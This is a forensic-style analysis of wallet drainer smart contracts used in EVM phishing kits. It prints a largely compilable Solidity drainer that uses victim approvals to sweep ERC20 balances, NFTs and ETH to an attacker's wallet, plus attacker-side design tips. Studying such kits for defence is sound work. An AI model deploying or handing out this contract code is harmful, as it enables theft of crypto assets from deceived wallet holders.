# EVM Drainer Kit: Drainer Smart Contract(s) Code Flow Analysis

**Source Document:** Comprehensive EVM Drainer Forensic Report
**Date of Analysis:** May 12, 2025

## 1. Introduction

This document details the conceptual code execution flow and logic of **Drainer Smart Contract(s)** used in typical EVM wallet drainer kits. The analysis is strictly derived from the findings, descriptions, and conceptual Solidity snippets presented in the "Comprehensive EVM Drainer Forensic Report." These smart contracts are deployed by attackers and are instrumental in centralizing and executing the theft of assets once a victim has granted approvals.

## 2. Core Objectives of Drainer Smart Contract Code

Based on the forensic report, drainer smart contracts serve several key purposes:

1.  **Receive Asset Control:** Act as the `spender` or `operator` address to which victims grant ERC20 token approvals or NFT `setApprovalForAll` permissions.
2.  **Execute Asset Transfers:** Contain functions that, when called by an attacker-controlled Externally Owned Account (EOA) (usually the backend server's wallet), use the victim's approvals to transfer assets from the victim's wallet to an attacker's collection wallet.
3.  **Batch Operations (Optional):** More sophisticated drainer contracts might include functions to transfer multiple types of assets (e.g., various ERC20 tokens, NFTs from different collections) in a single transaction (multicall pattern) to save gas and time, as hinted in the report's discussion of advanced kits.
4.  **Obfuscation/Minimalism:** Often, these contracts are kept simple to reduce deployment costs and audit scrutiny. Their logic is straightforward: take approved assets. The report notes that sometimes attackers don't even use a dedicated drainer contract for ERC20s if `permit` is used, or if they directly call `transferFrom` from a backend EOA that the victim approved (though a contract spender is more common for broader approval harvesting).

## 3. Conceptual Code Execution Flow (Solidity-centric)

The forensic report implies that these contracts are written in Solidity and deployed on the target EVM chains.

### 3.1. Contract Deployment and Ownership

*   **Execution Step (Attacker Setup): Deploy the Drainer Contract.**
    *   **Logic:** The attacker compiles and deploys the Solidity contract to the blockchain.
    *   **Code Concept (Report Implication - Basic Structure):**
        ```solidity
        // SPDX-License-Identifier: MIT
        pragma solidity ^0.8.0;

        import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
        import "@openzeppelin/contracts/token/ERC721/IERC721.sol";
        // Potentially IERC1155 if supported

        contract BasicDrainer {
            address payable public owner; // Attacker's EOA that controls the contract
            address payable public collectionWallet; // Attacker's wallet to receive drained funds

            event FundsDrained(address indexed victim, address indexed token, uint256 amount);
            event NftDrained(address indexed victim, address indexed nftContract, uint256 tokenId);

            constructor(address payable _collectionWallet) {
                owner = payable(msg.sender);
                collectionWallet = _collectionWallet;
            }

            modifier onlyOwner() {
                require(msg.sender == owner, "Not owner");
                _;
            }

            function setCollectionWallet(address payable _newWallet) external onlyOwner {
                collectionWallet = _newWallet;
            }

            // ... (Draining functions below)
        }
        ```
    *   **Functionality:** Establishes the contract on-chain. The `owner` is the attacker's EOA that can call privileged functions (like withdrawing ETH sent to the contract or changing the collection wallet). The `collectionWallet` is where drained assets are sent.
    *   **Report Reference:** The existence of such contracts is a core element of the "Drainer Smart Contract(s)" component in the report.

### 3.2. Function: Draining Approved ERC20 Tokens

*   **Execution Step (Backend Triggered): Attacker's EOA (backend wallet) calls `drainErc20Token`.**
    *   **Logic:** This function is called by the attacker after the victim has approved the `BasicDrainer` contract to spend their ERC20 tokens.
    *   **Code Concept (Report Implication):**
        ```solidity
        // function drainErc20Token(address _tokenAddress, address _victimAddress, uint256 _amount) external onlyOwner {
        //     IERC20 token = IERC20(_tokenAddress);
        //     // Ensure this contract has allowance from victim
        //     // uint256 allowance = token.allowance(_victimAddress, address(this));
        //     // require(allowance >= _amount, "Insufficient allowance"); -- This check is good practice but drainers might skip it and just try, relying on prior off-chain checks.

        //     // Attempt to transfer the tokens from victim to the collection wallet
        //     // The actual amount transferred might be less if victim has less than _amount, or if allowance is less.
        //     // Drainers often try to transfer the full balance they are aware of, up to the allowance.
        //     token.transferFrom(_victimAddress, collectionWallet, _amount);
        //     emit FundsDrained(_victimAddress, _tokenAddress, _amount);
        // }

        // A more common pattern is to drain the maximum possible based on current balance and allowance:
        function drainFullErc20Balance(address _tokenAddress, address _victimAddress) external onlyOwner {
            IERC20 token = IERC20(_tokenAddress);
            uint256 victimBalance = token.balanceOf(_victimAddress);
            uint256 currentAllowance = token.allowance(_victimAddress, address(this));
            uint256 amountToDrain = (victimBalance < currentAllowance) ? victimBalance : currentAllowance;

            if (amountToDrain > 0) {
                token.transferFrom(_victimAddress, collectionWallet, amountToDrain);
                emit FundsDrained(_victimAddress, _tokenAddress, amountToDrain);
            }
        }
        ```
    *   **Functionality:** Uses the `transferFrom` function of the target ERC20 token contract. The `_victimAddress` is the owner of the tokens, `address(this)` (the drainer contract) is the spender, and `collectionWallet` is the recipient.
    *   **Data Flow:** Inputs are `_tokenAddress`, `_victimAddress`. The function interacts with the specified ERC20 contract to move funds.
    *   **Report Reference:** This is the primary mechanism for stealing ERC20 tokens described in the report.

### 3.3. Function: Draining Approved ERC721 NFTs

*   **Execution Step (Backend Triggered): Attacker's EOA calls `drainNft`.**
    *   **Logic:** Called after the victim has approved the `BasicDrainer` contract for all their NFTs of a specific collection (`setApprovalForAll`) or for a specific NFT (`approve`). `setApprovalForAll` is more common for drainers.
    *   **Code Concept (Report Implication):**
        ```solidity
        // function drainNft(address _nftContractAddress, address _victimAddress, uint256 _tokenId) external onlyOwner {
        //     IERC721 nftContract = IERC721(_nftContractAddress);
        //     // require(nftContract.isApprovedForAll(_victimAddress, address(this)) || nftContract.getApproved(_tokenId) == address(this), "Not approved"); -- Good practice, drainers might skip.

        //     nftContract.safeTransferFrom(_victimAddress, collectionWallet, _tokenId);
        //     emit NftDrained(_victimAddress, _nftContractAddress, _tokenId);
        // }

        // If draining multiple known token IDs from a collection where setApprovalForAll was granted:
        function drainMultipleNfts(address _nftContractAddress, address _victimAddress, uint256[] calldata _tokenIds) external onlyOwner {
            IERC721 nftContract = IERC721(_nftContractAddress);
            // require(nftContract.isApprovedForAll(_victimAddress, address(this)), "Not approved for all");
            for (uint i = 0; i < _tokenIds.length; i++) {
                // A check if victim still owns the NFT might be here in a careful drainer
                // if (nftContract.ownerOf(_tokenIds[i]) == _victimAddress) { ... }
                nftContract.safeTransferFrom(_victimAddress, collectionWallet, _tokenIds[i]);
                emit NftDrained(_victimAddress, _nftContractAddress, _tokenIds[i]);
            }
        }
        ```
    *   **Functionality:** Uses the `safeTransferFrom` (or `transferFrom`) function of the target ERC721 NFT contract.
    *   **Data Flow:** Inputs are `_nftContractAddress`, `_victimAddress`, and `_tokenId` (or an array of token IDs). Interacts with the specified NFT contract.
    *   **Report Reference:** Key method for stealing NFTs as per the report.

### 3.4. Function: Withdrawing ETH (sent accidentally or as part of a different scheme)

*   **Execution Step (Backend Triggered): Attacker's EOA calls `withdrawEth`.**
    *   **Logic:** Allows the attacker to retrieve any Ether that might have been sent directly to the drainer contract address.
    *   **Code Concept (Report Implication):**
        ```solidity
        // function withdrawEth() external onlyOwner {
        //     (bool success, ) = owner.call{value: address(this).balance}("");
        //     require(success, "ETH withdrawal failed");
        // }
        // Or directly to collectionWallet:
        function withdrawEthToCollection() external onlyOwner {
            (bool success, ) = collectionWallet.call{value: address(this).balance}("");
            require(success, "ETH withdrawal failed");
        }
        // It's also common to have a receive() external payable {} or fallback() external payable {} function
        // to allow the contract to receive ETH directly.
        receive() external payable {}
        fallback() external payable {}
        ```
    *   **Functionality:** Transfers the entire ETH balance of the contract to the `owner` or `collectionWallet`.
    *   **Report Reference:** General smart contract practice for fund retrieval, applicable if the drainer contract itself accumulates ETH.

### 3.5. Multicall Pattern (Advanced, as hinted by report)

*   **Logic:** Some advanced drainers might implement a `multicall` function to batch multiple draining actions (e.g., several `transferFrom` calls for different tokens) into a single transaction from the attacker's EOA. This saves gas and can be faster.
*   **Code Concept (Report Implication - Conceptual):**
    ```solidity
    // function multicall(bytes[] calldata data) external onlyOwner returns (bytes[] memory results) {
    //     results = new bytes[](data.length);
    //     for (uint i = 0; i < data.length; i++) {
    //         (bool success, bytes memory result) = address(this).call(data[i]); // Calls other functions within this contract
    //         require(success, "Multicall_CallFailed");
    //         results[i] = result;
    //     }
    // }
    // The `data` array would contain encoded function calls to `drainErc20Token`, `drainNft`, etc.
    ```
*   **Functionality:** Iterates through an array of call data and executes each call within the context of the drainer contract.
*   **Report Reference:** The report mentions batching and efficiency as characteristics of more sophisticated kits.

## 4. Security Considerations (from Attacker's Perspective)

*   **`onlyOwner` Modifier:** Crucial to ensure only the attacker can trigger drain functions or change settings.
*   **Simplicity:** Keeping the contract logic minimal reduces gas costs for deployment and execution, and lessens the chance of bugs the attacker might introduce.
*   **Upgradability (Rare for simple drainers):** Most drainers are deploy-and-forget, but a proxy pattern could be used if upgradability was desired (unlikely given their illicit nature and short lifespan).

## 5. Conclusion

The Drainer Smart Contract is a pivotal on-chain component. Its code is designed to be a secure (for the attacker) and efficient tool for leveraging victim-granted approvals. The typical execution flow involves the attacker's backend server, acting as the contract `owner`, calling specific functions on the drainer contract (`drainErc20Token`, `drainNft`). These functions then execute the `transferFrom` or `safeTransferFrom` calls on the respective token/NFT contracts, using the allowance granted by the victim to `address(this)` (the drainer contract), thereby moving assets to the attacker's `collectionWallet`. The simplicity of these contracts often belies their devastating effectiveness when combined with a deceptive frontend and a robust backend.

